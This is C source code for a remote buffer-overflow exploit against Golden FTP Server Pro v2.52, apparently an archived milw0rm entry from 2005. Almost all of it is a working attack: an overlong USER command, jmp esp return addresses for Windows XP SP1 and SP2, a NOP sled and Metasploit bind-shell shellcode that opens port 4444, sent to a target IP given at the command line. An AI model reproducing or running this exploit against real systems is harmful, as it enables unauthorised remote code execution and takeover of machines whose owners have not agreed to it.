/*
*
* Golden FTP Server Pro Remote Buffer Overflow Exploit
* Bug Discovered by Reed Arvin (http://reedarvin.thearvins.com)
* Exploit coded By ATmaCA
* Web: atmacasoft.com && spyinstructors.com
* E-Mail: atmaca@icqmail.com
* Credit to kozan and metasploit
* Usage:exploit <targetOs> <targetIp>
*
*/

/*
*
* Vulnerable Versions:
* Golden FTP Server Pro v2.52
*
* Exploit:
* Run the exploit against the server. Afterward, right
* click on the Golden FTP Server Pro icon in the Windows tray and click
* Statistic.
* It will open bind shell on port 4444
*
*/

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char userreq[] =
"USER "
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

char *target[]=  //return addr
{
       "\xFC\x18\xD7\x77",   //WinXp Sp1 Eng - jmp esp addr
       "\xBF\xAC\xDA\x77"    //WinXp Sp2 Eng - jmp esp addr
};

char shellcode[] =
/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=348 Encoder=PexFnstenvSub http://metasploit.com */
"\x31\xc9\x83\xe9\xaf\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x82"
"\x2a\x64\x94\x83\xeb\xfc\xe2\xf4\x7e\x40\x8f\xdb\x6a\xd3\x9b\x6b"
"\x7d\x4a\xef\xf8\xa6\x0e\xef\xd1\xbe\xa1\x18\x91\xfa\x2b\x8b\x1f"
"\xcd\x32\xef\xcb\xa2\x2b\x8f\x77\xb2\x63\xef\xa0\x09\x2b\x8a\xa5"
"\x42\xb3\xc8\x10\x42\x5e\x63\x55\x48\x27\x65\x56\x69\xde\x5f\xc0"
"\xa6\x02\x11\x77\x09\x75\x40\x95\x69\x4c\xef\x98\xc9\xa1\x3b\x88"
"\x83\xc1\x67\xb8\x09\xa3\x08\xb0\x9e\x4b\xa7\xa5\x42\x4e\xef\xd4"
"\xb2\xa1\x24\x98\x09\x5a\x78\x39\x09\x6a\x6c\xca\xea\xa4\x2a\x9a"
"\x6e\x7a\x9b\x42\xb3\xf1\x02\xc7\xe4\x42\x57\xa6\xea\x5d\x17\xa6"
"\xdd\x7e\x9b\x44\xea\xe1\x89\x68\xb9\x7a\x9b\x42\xdd\xa3\x81\xf2"
"\x03\xc7\x6c\x96\xd7\x40\x66\x6b\x52\x42\xbd\x9d\x77\x87\x33\x6b"
"\x54\x79\x37\xc7\xd1\x79\x27\xc7\xc1\x79\x9b\x44\xe4\x42\x75\xc8"
"\xe4\x79\xed\x75\x17\x42\xc0\x8e\xf2\xed\x33\x6b\x54\x40\x74\xc5"
"\xd7\xd5\xb4\xfc\x26\x87\x4a\x7d\xd5\xd5\xb2\xc7\xd7\xd5\xb4\xfc"
"\x67\x63\xe2\xdd\xd5\xd5\xb2\xc4\xd6\x7e\x31\x6b\x52\xb9\x0c\x73"
"\xfb\xec\x1d\xc3\x7d\xfc\x31\x6b\x52\x4c\x0e\xf0\xe4\x42\x07\xf9"
"\x0b\xcf\x0e\xc4\xdb\x03\xa8\x1d\x65\x40\x20\x1d\x60\x1b\xa4\x67"
"\x28\xd4\x26\xb9\x7c\x68\x48\x07\x0f\x50\x5c\x3f\x29\x81\x0c\xe6"
"\x7c\x99\x72\x6b\xf7\x6e\x9b\x42\xd9\x7d\x36\xc5\xd3\x7b\x0e\x95"
"\xd3\x7b\x31\xc5\x7d\xfa\x0c\x39\x5b\x2f\xaa\xc7\x7d\xfc\x0e\x6b"
"\x7d\x1d\x9b\x44\x09\x7d\x98\x17\x46\x4e\x9b\x42\xd0\xd5\xb4\xfc"
"\x72\xa0\x60\xcb\xd1\xd5\xb2\x6b\x52\x2a\x64\x94";

char nops[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

char passreq[] =
"PASS \r\n";

void main(int argc, char *argv[])
{
        WSADATA wsaData;
        WORD wVersionRequested;
        struct hostent  *pTarget;
        struct sockaddr_in 	sock;
        SOCKET mysocket;
        char rec[1024];

        if (argc < 3)
        {
                printf("\r\nGolden FTP Server Pro Remote Buffer Overflow Exploit\r\n",argv[0]);
                printf("Bug Discovered by Reed Arvin (http://reedarvin.thearvins.com)\r\n");
                printf("Exploit coded By ATmaCA\r\n");
                printf("Web: atmacasoft.com && spyinstructors.com\r\n");
                printf("Credit to kozan and metasploit\r\n");
                printf("Usage:\r\nexploit <targetOs> <targetIp>\r\n\r\n",argv[0]);
                printf("Targets:\n");
                printf("1 - WinXP SP1 english\n");
                printf("2 - WinXP SP2 english\n");
                printf("Example:exploit 2 127.0.0.1\n");

                return;
       }
       int targetnum = atoi(argv[1]) - 1;

       char *evilbuf = (char*)malloc(sizeof(userreq)+sizeof(shellcode)+sizeof(nops)
                                +sizeof(passreq)+7);
       strcpy(evilbuf,userreq);
       strcat(evilbuf,target[targetnum]);
       strcat(evilbuf,nops);
       strcat(evilbuf,shellcode);
       strcat(evilbuf,"\r\n");
       strcat(evilbuf,passreq);
       //printf("%s",evilbuf);

       wVersionRequested = MAKEWORD(1, 1);
       if (WSAStartup(wVersionRequested, &wsaData) < 0) return;



       mysocket = socket(AF_INET, SOCK_STREAM, 0);
       if(mysocket==INVALID_SOCKET){
                  printf("Socket error!\r\n");
                  exit(1);
       }

       printf("Resolving Hostnames...\n");
       if ((pTarget = gethostbyname(argv[2])) == NULL){
                  printf("Resolve of %s failed\n", argv[1]);
                  exit(1);
       }

       memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
       sock.sin_family = AF_INET;
       sock.sin_port = htons(21);

       printf("Connecting...\n");
       if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) ))){
                  printf("Couldn't connect to host.\n");
                  exit(1);
       }

       printf("Connected!...\n");
       printf("Waiting for welcome message...\n");
       Sleep(10);
       recv(mysocket,rec,1024,0);

       printf("Sending evil request...\n");
       if (send(mysocket,evilbuf, strlen(evilbuf)+1, 0) == -1){
                  printf("Error Sending evil request.\r\n");
                  closesocket(mysocket);
                  exit(1);
       }

       Sleep(10);
       printf("Success.\n");
       closesocket(mysocket);
       WSACleanup();
}

// milw0rm.com [2005-04-29]
